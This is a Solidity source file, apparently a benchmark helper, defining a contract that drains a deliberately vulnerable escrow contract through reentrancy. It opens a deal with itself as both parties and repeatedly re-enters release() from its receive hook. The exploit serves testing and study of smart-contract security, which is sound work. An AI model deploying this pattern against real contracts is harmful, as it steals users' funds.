// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {VulnerableEscrow} from "./VulnerableEscrow.sol";

/// @title ReentrancyAttacker
/// @notice Drains a VulnerableEscrow by acting as buyer and seller of its own deal and
///         re-entering release() from its receive hook.
/// @dev Benchmark helper only.
contract ReentrancyAttacker {
    VulnerableEscrow public immutable victim;

    uint256 public dealId;
    uint256 private _stake;

    constructor(VulnerableEscrow _victim) {
        victim = _victim;
    }

    function attack() external payable {
        _stake = msg.value;
        dealId = victim.createEscrow{value: msg.value}(address(this));
        victim.release(dealId);
    }

    receive() external payable {
        if (address(victim).balance >= _stake) {
            victim.release(dealId);
        }
    }
}
